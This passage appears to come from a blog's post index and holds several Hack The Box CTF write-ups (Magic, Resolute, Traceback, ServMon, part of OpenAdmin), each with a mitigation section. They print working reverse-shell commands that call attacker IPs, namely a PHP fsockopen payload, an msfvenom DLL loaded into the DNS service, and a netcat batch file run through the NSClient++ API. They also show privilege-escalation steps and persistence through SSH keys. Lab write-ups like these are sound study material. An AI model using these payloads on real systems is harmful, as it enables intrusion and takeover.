machine.http://10.10.10.185/images/uploads/sponge.php.jpg?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.15.2%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27We successfully connect. Let’s run a python command to upgrade our shell.$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;We’ll have a look around. First things first, we are the www-data user and don’t currently have access to user.txt flag. But there appears to be a user, theseus, that may have access. Let’s try to escalate our privileges.Within the Magic subdirectory of the webserver, we find a database file. Looking at the contents, we can see a password iamkingtheseus.Using this password to change users to theseus doesn’t work, but we may be able to access the database to reveal further credentials. The command mysqldump is present on the box; we can use it to dump the login table in the Magic database.$ mysqldump -u theseus -piamkingtheseus Magic loginThe command executes correctly, and we can see values containing a username and password.Let’s re-attempt log in, this time with our new password.$ su theseusPassword: Th3s3usW4sK1ngWe log in as user theseus. Let’s grab the user flag. On to root!Root FlagFirst thing we’ll do is add our public key, granting us a bit more reliable persistence to the machine. I usually reference Linux Handbook for details on how to do this.$ cd /home/theseus/.ssh$ printf &quot;[public key]&quot; &amp;gt;&amp;gt; authorized_keysNow we can connect via SSH. First, though, let’s upload the Linux Smart enumeration with secure copy.$ scp lse.sh theseus@10.10.10.185:/tmpNow, we’ll connect and run our enumeration script. One thing quickly stands out: it looks like an unusual SUID bit is set for the sysinfo command.Viewing the file information for /bin/sysinfo shows the owner is root and, because the SUID bit is set, this file with execute as the owner. Hacking Articles has a great write-up detailing exactly how we can abuse SUID to escalate our privileges.$ ls -al /bin/sysinfo-rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfoLet’s go ahead and upload pspy64, an unprivileged process spy, and use it view exactly what is called and executed when we run sysinfo.$ scp pspy64 theseus@10.10.10.185:/tmpRunning sysinfo, we can see it calls a couple commands, one of which is lshw.Because it does not specify the full path of the command, instead relying on the system $PATH variable, we can manipulate the path to execute whatever command we want. Hacking Articles has another article on this topic.First, we’ll create a file lshw in the /tmp directory. Then we will add the /tmp directory to the system path. When sysinfo is ran, it’ll execute our script first, opening a bash shell as root.$ cd /tmp$ echo &quot;/bin/bash&quot; &amp;gt; lshw$ chmod 777 lshw$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin$ export PATH=/tmp:$PATH$ sysinfoRunning sysinfo, our root shell successfully spawns.I had problems seeing the results of my commands in this shell so let’s add our public SSH key to root’s authorized_keys file.$ cd /root/.ssh$ mkdir .ssh$ printf &quot;[public key]&quot; &amp;gt;&amp;gt; authorized_keysFinally, we’ll connect via SSH and capture the final flag!Mitigation Input validation to avoid SQL injection is very important. Bypassing a log in is pretty mild in comparison to dumping a database, but both are dangerous. Positive Technologies has some great information to help mitigate the risk of this occurring. In line with input validation, image validation is also of top priority. As this box demonstrates, weak validation can lead to remote code execution. At the least, there was some level of validation occurring, but only checking the last extension on a file is easily bypassed. OWASP has an awesome cheat sheet detailing mitigation techniques for file upload vulnerabilities. Avoid password reuse. Shared passwords between services is one of the easiest ways to escalate or move laterally. Setting the SUID bit can be useful to allow users to run certain programs with a higher level of privilege and it does adhere to the security principle of Least Privilege, however, a system administrator must carefully consider the risks of enabling SUIDs. In this particular scenario, ensuring that the sysinfo program used full paths for the commands it executed would’ve prevented the path injection attack. Final ThoughtsThis was a great box, one of my favorites, I enjoyed it at every step. It was certainly challenging and I learned a ton about basic web application vulnerabilities." }, { "title": "Hack the Box - Resolute", "url": "/posts/HTB-Resolute/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-04-29 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine Resolute. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration enum4linuxExploitation Weak password policyPriv Esc DNS Admin Privilege EscalationUser FlagFirst thing’s first. We’ll run my nmap scan. Resolute is running a ton of services, all pointing to a potential Active Directory DC. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Sat May 23 14:52:02 2020 as: nmap -sC -sV -O -oA scan169 10.10.10.169Nmap scan report for 10.10.10.169Host is up (0.059s latency).Not shown: 989 closed portsPORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings: | DNSVersionBindReqTCP: | version|_ bind88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-23 20:02:44Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=5/23%Time=5EC97EF0%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\SF:x04bind\\0\\0\\x10\\0\\x03&quot;);No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=5/23%OT=53%CT=1%CU=44091%PV=Y%DS=2%DC=I%G=Y%TM=5EC97F8OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=OS:A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=SOS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=OS:N%T=80%CD=Z)Network Distance: 2 hopsService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h30m33s, deviation: 4h02m31s, median: 10m32s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Resolute| NetBIOS computer name: RESOLUTE\\x00| Domain name: megabank.local| Forest name: megabank.local| FQDN: Resolute.megabank.local|_ System time: 2020-05-23T13:03:15-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-05-23T20:03:16|_ start_date: 2020-05-23T18:24:50OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat May 23 14:54:54 2020 -- 1 IP address (1 host up) scanned in 172.73 secondsAfter the results come back, we’ll also run a full port scan to see if any additional ports may be open.$ sudo nmap -sC -sV -O -p- -oA full169 10.10.10.1695985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)The port that we’ll make note of from the full scan is 5985. This tells us that the box is running WinRM 2.0 (Microsoft Windows Remote Management). Once we find some credentials, we may be able to gain a foothold through this service.Next, we’ll run enum4linux, a tool primarily used to enumerate Windows or Samba systems.$ enum4linux -U -o 10.10.10.169It looks like an admin mistakenly left a default password in the description on a user account. Odds are, one of these users may not have changed their default password.Using evil-winrm, a Windows Remote Management tool for pentesting, we’ll try each username with the password. Eventually, we successfully log in with user melanie, attaining a foothold on Resolute.$ evil-winrm -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39;Once in, we find the user flag on melanie’s desktop.Root FlagNext, we need to escalate privileges. We’ll start looking around the file system, seeing if anything stands out. We find a PowerShell log within the directory C:\\PSTranscripts\\20191203 that may contain something of interest.&amp;gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txtWithin this transcript is a password for the user ryan. Additionally, the password may imply that ryan has some level of administrative privileges.Using our newly attained credentials, we’ll log in as ryan using evil-winrm.$ evil-winrm -i 10.10.10.169 -u ryan -p &#39;Serv3r4Admin4cc123!&#39;On ryan’s desktop there is a note that indicates that all changes are reverted within a minute. we’ll keep that in mind as we continue.Next, we want to see if ryan has any unique privileges. We’ll use net user and can see that ryan is in the Contractors group. This indicates to us that the user may have administrator rights. Because Resolute also has DNS enabled, we can assume that ryan is also a DNS Admin or has write privileges to the DNS server object.&amp;gt; net user ryan /domainGlobal Group memberships *Domain Users *ContractorsThis article has a great write-up on how to abuse a DNS Admin account to escalate privileges. For brevity, we will inject a poisoned DLL into the DNS executable, which will create a SYSTEM-level shell when the DNS process is restarted.Using msfvenom, we will create the malicious DLL payload.$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.234 LPORT=4444 -f dll &amp;gt; privesc.dllWe’ll set up a listener as well, in preparation for the reverse shell.$ nc -lvnp 4444Now we need to get our payload onto the machine. We’ll choose to host the payload on my machine using smbserver.py from impacket.$ sudo python smbserver.py share ./On the Resolute box, we’ll run the command to retrieve our poisoned DLL and inject it into dns.exe.&amp;gt; dnscmd Resolute.megabank.local /config /serverlevelplugindll \\\\10.10.14.234\\share\\privesc.dllFinally, we’ll restart DNS. This needs to be done relatively quickly to avoid changes being reverted.&amp;gt; sc.exe stop dns&amp;gt; sc.exe start dnsOur reverse shell connects and we confirm that we have successfully rooted the box!On the Administrator’s desktop we’ll grab the final flag.Mitigation Enforcing password policies would’ve prevented a default password from remaining on an active account. Password expirations or requiring a password change on login would’ve also helped. Using a password in the command on Powershell or in CLI may be convenient, but a user, especially a user with elevated privileges, should understand the risks associated with logging this information. The article detailing the DNS privilege escalation also contains some mitigation techniques regarding a user abusing DNS. Primarily, an Administrator should audit those who have write privileges to the DNS object and those that are members of the DNSAdmin group. Additionally, logs can indicate when a user may be abusing this. Final ThoughtsOverall, I really enjoyed this box. Being one of my first Windows machines, I learned a lot about Windows enumeration, and it was beneficial seeing this sort of privilege escalation. I also thought the use of poor password policies and account management was a realistic way to gain unauthorized access." }, { "title": "Hack the Box - Traceback", "url": "/posts/HTB-Traceback/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-04-27 13:00:00 -0500", "snippet": "This is my write up for the HackTheBox Linux machine Traceback. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration OSINT dirbuster Process Spying Exploitation Reverse shellPriv Esc GTFOBins File permission abuse User FlagLet’s start by scanning the Traceback machine using nmap. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Sat Apr 25 13:14:52 2020 as: nmap -sC -sV -O -oA scan181 10.10.10.181Nmap scan report for 10.10.10.181Host is up (0.086s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)| 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Help us4444/tcp open krb524?No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=8/17%OT=22%CT=1%CU=33973%PV=Y%DS=2%DC=I%G=Y%TM=5F3B1A4OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=ASOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%TOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=OS:S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Aug 17 19:01:11 2020 -- 1 IP address (1 host up) scanned in 42.92 secondsThe open ports from our nmap results indicate that this is a web server (port 80), with SSH remote access (port 22) available.Since we lack SSH credentials, let’s check out the webpage.It looks like this site has already been hacked, and the attacker states that they have left a backdoor on the machine. There isn’t much more information or additional apparent webpages, so let’s check out the source for the page.&amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;This site has been owned&amp;lt;/h1&amp;gt; &amp;lt;h2&amp;gt;I have left a backdoor for all the net. FREE INTERNETZZZ&amp;lt;/h2&amp;gt; &amp;lt;h3&amp;gt; - Xh4H - &amp;lt;/h3&amp;gt; &amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt; &amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;Something interesting stands out, the attacker left a comment within the source HTML. Googling this comment returns a github page with different web shells. Judging by the message, we can assume that the attacker left one of these on the web server.Let’s go ahead and create a list with the filenames for these shells and use dirb to enumerate through it.$ dirb http://10.10.10.181/ webshell-list.txtThe webpage http://10.10.10.181/smevk.php successfully returns a status code 200, indicating that it is available. Let’s navigate to it in our web browser.Looks like we’ll need some credentials for the shell. Referring back to the source code for the shell, we find the default login information is admin:admin.//Make your setting here.$deface_url = &#39;http://pastebin.com/raw.php?i=FHfxsFGT&#39;; //deface url here(pastebin).$UserName = &quot;admin&quot;; //Your UserName here.$auth_pass = &quot;admin&quot;; //Your Password.Trying this, we log in successfully.The shell has a lot of options to sift through but the first thing that stands out is the capability to upload files through the shell interface. It also looks like this shell is running as user webadmin.Command execution is limited through this shell, so let’s try to upload a reverse shell. We’ll use this one from pentestmonkey.First, let’s start our listener for our reverse shell.$ nc -lvnp 4444After successfully uploading the shell, we can navigate to the page http://10.10.10.181/php-reverse-shell.php, which connects to our listener, providing us with a shell!After having a look around, we find a text document named note.txt within the home directory of the user webadmin.$ cd /home/webadmin$ cat note.txt- sysadmin -I have left a tool to practice Lua.I&#39;m sure you know where to find it.Contact me if you have any question.Looks like the system admin left a tool for the web admin to practice Lua, a programming language, with. Let’s also check our privileges with the command sudo -l.The results indicate that we can run the luvit command as the user sysadmin without a password. A little research reveals that luvit is a tool used that provides asynchronous I/O for Lua and can run scripts in the CLI. Addtionally, GTFOBins has some information regarding abusing Lua to escalate privileges.We’ll create a Lua script that will open a shell as the user sysadmin. This should escalate our privileges.$ touch pe.lua$ printf &quot;os.execute(&#39;/bin/bash -i&#39;)&quot; &amp;gt; pe.lua$ sudo -u sysadmin /home/sysadmin/luvit pe.luaSuccess! We are now sysadmin. Let’s grab the user flag.Root FlagNow that we’ve successfully escalated privileges, let’s go ahead and create persistence, this will also assist us as move forward to getting root access.We’ll add our public key to the authorized_keys file within the hidden .ssh subdirectory in the home directory of sysadmin.Linux Handbook has a great article on how we can do this. Having already generated the keys, the next step is for us to add our public key on the remote host. The we can connect via SSH.As sysadmin and within the .ssh subdirectory, we will create the authorized_keys file, and use the printf command to append our public SSH key to the file.$ touch authorized_keys$ printf &quot;\\n[my public ssh key]\\n&quot; &amp;gt;&amp;gt; authorized_keysNow that we have more reliable persistence and the ability to transfer files, let’s upload pspy64, an unprivileged process spy, so we can enumerate processes.Let’s use secure copy with our SSH access to get it onto the box.$ scp pspy64 sysadmin@10.10.10.181:/tmpWithin our SSH session, we’ll run pspy64.One process that stands out refers to the motd.d or “Message of the Day” daemon. Essentially, the backup “Message of the Day” is replacing the current motd.d every 30 seconds.More useful info on motd.d can be found here.This process certainly stands out. Let’s examine the 00-header file, which contains the actual “Message of the Day”, a bit further.$ ls -al /etc/update-motd.d/00-header-rwxrwxr-x 1 root sysadmin 981 Jun 2 10:40 /etc/update-motd.d/00-headerIt looks like our header file can be edited by the sysadmin, yet is executed as root. This is a script, so we should be able to add commands that will execute as root and potentially escalate our privileges. Additionally, it looks like the previous attacker already edited this file with their own message.We’ll run the following command, which will append some script to the motd.d header file that, when executed, will add our public SSH key to the authorized_keys file of the root user.echo &quot;printf \\&quot;\\n[my public ssh key]\\n\\&quot; &amp;gt;&amp;gt; /root/.ssh/authorized_keys&quot; &amp;gt;&amp;gt; 00-headerThe command within the 00-header file will only execute when it is called, which occurs when a user logs in or connects via SSH. Additionally, the backup overwrites this file every 30 seconds, so we need to be quick.Once we’ve run the command to append our public SSH key, we can SSH as sysadmin which will execute the command. Our public key should now be in the root user’s authorized_keys file.We can now successfully connect with SSH as root! Let’s capture the final flag.MitigationThis box is interesting considering the scenario places us attempting access after another hack. It’s excellent practice from a recovery or forensic standpoint but it’s difficult to describe certain mitigation techniques as we do not know how the attacker gained their initial foothold. Regardless, I’ve included some mitigation techniques I’ve found regarding privilege escalation. Carefully consider the risks of providing other users with certain escalated privileges, especially when it allows commands to be run as other users. This has a risk of being exploited and resources like GTFOBins demonstrate the plethora of options to do this. Avoid allowing lower privileged users the ability to edit scripts that are executed as a higher privileged user, especially as root. This can certainly lead to abuse if an attacker has access to the lower privileged account. Routine checks should be done to ensure that files don’t have dangerous or potentially exploitable permissions and the risks associated with any changes to the default permissions should be understood. Final ThoughtsThis was only my second Linux machine at the time and I learned a lot, especially about Linux specific file structures and permissions. Doing some basic process enumeration was also beneficial and I enjoyed the challenge of using the resources I had to progress, without just finding a pre-made proof of concept or exploit." }, { "title": "Hack The Box - ServMon", "url": "/posts/HTB-ServMon/", "categories": "Hack the Box, Windows", "tags": "windows, ctf, htb", "date": "2020-04-24 13:00:00 -0500", "snippet": "This is my guide to the HackTheBox Windows machine ServMon. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration FTP anonymous loginExploitation NVMS-1000 directory traversal attack Weak password policy Priv Esc NSClient++ privilege escalation exploitUser FlagTo start out, we’ll run an nmap scan. The results seem to indicate that ServMon is a Windows webserver. sC: Enable common scripts sV: version and service on the port O: remote OS detection using fingerprinting # Nmap 7.80 scan initiated Wed Jun 24 21:14:11 2020 as: nmap -sC -sV -O -oA scan184 10.10.10.184Nmap scan report for 10.10.10.184Host is up (0.081s latency).Not shown: 991 closed portsPORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_01-18-20 12:05PM &amp;lt;DIR&amp;gt; Users| ftp-syst: |_ SYST: Windows_NT22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)| 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)|_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)80/tcp open http| fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK| Content-type: text/html| Content-Length: 340| Connection: close| AuthInfo: | &amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;| &amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;| &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;| window.location.href = &quot;Pages/login.htm&quot;;| &amp;lt;/script&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;/body&amp;gt;| &amp;lt;/html&amp;gt;| NULL: | HTTP/1.1 408 Request Timeout| Content-type: text/html| Content-Length: 0| Connection: close|_ AuthInfo:|_http-title: Site doesnt have a title (text/html).135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?5666/tcp open tcpwrapped6699/tcp open napster?8443/tcp open ssl/https-alt| fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404| Content-Length: 18| Document not found| GetRequest: | HTTP/1.1 302| Content-Length: 0|_ Location: /index.html| http-title: NSClient++|_Requested resource was /index.html| ssl-cert: Subject: commonName=localhost| Not valid before: 2020-01-14T13:24:20|_Not valid after: 2021-01-13T13:24:20|_ssl-date: TLS randomness does not represent time2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============[...]Network Distance: 2 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 4m12s| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-06-25T02:20:31|_ start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun 24 21:16:32 2020 -- 1 IP address (1 host up) scanned in 141.75 secondsOnce we receive the results of the first scan, we’ll perform a full one as well. On this box, it yields nothing.The first thing we see is that nmap indicates that anonymous login on FTP port 21 is enabled. This may yield some access to the file system. Let’s attempt the username anonymous with no password. We connect succesfully!Only a few files are present but there is enough here to help enumerate the system a bit more. Within the users directory are two directories for users nadine and nathan. Additionally, each user has a file saved. With the get command, we retrieve a copy of each one.ftp&amp;gt; cd Nadineftp&amp;gt; get Confidential.txtftp&amp;gt; cd ..ftp&amp;gt; cd Nathanftp&amp;gt; get &quot;Notes to do.txt&quot;The Confidential.txt contains some interesting information:Nathan,I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.RegardsNadineIt looks like if we can gain access to Nathan’s desktop, we will find a file containing passwords. The Notes to do.txt also seems to indicate that user nathan has not removed the password file as requested. It may still be there.Okay, so with that, we’ve exhausted what is available within the FTP file share, let’s return to our nmap scan results. Next, we’ll navigate to the webpage.The box is hosting the service NVMS-1000, a management client for survellience devices. We don’t have much in the way of credentials, but we’ll just try a few basic combinations, to no avail.A quick google search reveals that this service is vulnerable to a directory traversal attack. Perfect! We know from earlier that a password file may still reside on Nathan’s desktop.For this attack, we’ll use Burp Suite to build my payload. First, we’ll configure burp as our proxy, turn on intercept, and capture the GET request for the NVMS login page, the main page on ServMon. Next, we’ll right-click and send that request to the repeater. We then change the path in the request to the directory traversal payload, and send it. Success! We now have arbitrary file access.Let’s modify the payload with the specified path of the potential location of the password file: /Users/Nathan/Desktop/passwords.txtWe receive a respond, with a list of passwords.We noted earlier that port 22 was open as well. We have some usernames and some passwords, so let’s attempt connection through SSH first. Our lists are pretty short but for good practice, we’ll use hydra.$ hydra -l users.txt -P passwords.txt 10.10.10.184 sshOne combination connects successfully, and we gain remote access as user nadine.$ ssh nadine@10.10.10.184password: L1k3B1gBut7s@W0rkLet’s grab the first flag from the user’s desktop.Root FlagSome quick enumeration as user nadine reveals little. Back stepping a bit, the nmap scan indicated that port 8443 was also open and running the service NSClient. In the browser, we’ll navigate to https://10.10.10.184:8443/.NSClient requires just a password so we’ll quickly attempt the ones from my previous list, but no luck. Searching online we find that NSClient is vulnerable to a privilege escalation exploit.The exploit states that the first step must be to find the webapp password with the nsclient.ini file. In our shell session, we can display the contents of the file and find the password.&amp;gt; type &quot;\\Program Files\\NSClient++\\nsclient.ini&quot;Additionally, we’ll note that the only authorized host is 127.0.0.1 or localhost.; Undocumented keypassword = ew2x6SsGTxjRwXOT; Undocumented keyallowed hosts = 127.0.0.1To bypass this restriction, let’s make a tunnel using SSH and forward the port. Linuxize provides a great write-up on this topic. Reconnecting with the following command should allow us to login in successfully.$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184Next, we’ll navigate to https://127.0.0.1:8443/ and attempt to login. Success!Unfortunately, the web application was too buggy and difficult to use without frustration, so I dug into the documentation for NSClient and decided to use curl commands to complete the exploit.The next step of the exploit requires a simple batch file for a reverse shell. Let’s name it evil.bat.@echo offc:\\temp\\nc.exe 10.10.14.2 4444 -e cmd.exeNext, we need to get my batch file and nc.exe onto ServMon. There a few different means to do that, but since we already have an SSH login, we’ll use SCP, or secure copy.$ cp /usr/share/windows-resources/binaries/nc.exe .$ scp nc.exe nadine@10.10.10.184:/Temp$ scp evil.bat nadine@10.10.10.184:/TempOn Kali, we’ll start an netcat listener.$ nc -lvnp 4444Using the documentation, we run the following command to add a script that will call our batch file.$ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.batAnd finally, we will execute the command to run the script.$ curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?time=3mOur listener successfully connects, and we now have system shell.Let’s capture the final flag on the Administrator’s desktop.Mitigation Firstly, disable anonymous login on FTP. Very few services in an organization benefit from having guest or anonymous logins. In this instance, simply disabling this on FTP would severely limit severity of the directory traversal attack. Software, especially public-facing, should be patched quickly, especially when a critical vulnerability like a directory traversal attack exists. If the patch does not become available or the vendor stops support, an organization should consider using different software. Never store passwords in plaintext. Previously mentioned methods of mitigation would’ve prevented an attacker from exploiting the privilege escalation vulnerability with NSClient++, as they would not have been able to forward ports nor have remote access to the file system. Regardless, layered security is key, and software patching still applies in this instance. Final ThoughtsI really enjoyed the process to root this box. Unfortunately, the issues during the privilege escalation caused a lot of frustration, but I appreciate how it drove me to read the documentation and find a more stable route, even getting me to use a tool that I have little experience with.Additionally, I felt it was important to see the impact that directory traversal can have in conjunction with some file system enumeration." }, { "title": "Hack The Box - OpenAdmin", "url": "/posts/HTB-OpenAdmin/", "categories": "Hack the Box, Linux", "tags": "linux, ctf, htb", "date": "2020-03-27 13:00:00 -0500", "snippet": "This write-up is an attempt to show my process of achieving root in the HackTheBox machine OpenAdmin. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.Task: Find user.txt and root.txtPenetration MethodologiesScanning nmapEnumeration dirbusterExploitation Known CVE (ona)Priv Esc Port Forwarding GTFOBins This was my first “start-to-finish” CTF challenge, and I learned a ton of new techniques and tools as I slowly picked my way through the box. As my first rooted machine, this was challenging, and I’m sure others will find success much faster than myself. Regardless, I wanted to take this opportunity to capture my methods and thought processes as I begin to delve into the CTF realm, while hopefully helping those struggling to find the next step.User FlagWe start by scanning the OpenAdmin machine using nmap. I generally output my scan to a text file for portability and easier access later. sV: version and service on the port A: the OS version and other things O: remote OS detection using fingerprinting script=banner: banner information # Nmap 7.80 scan initiated Sun Mar 29 12:33:17 2020 as: nmap -A -O -sV --script=banner -oN scan171.txt 10.10.10.171Nmap scan report for 10.10.10.171Host is up (0.22s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.380/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP 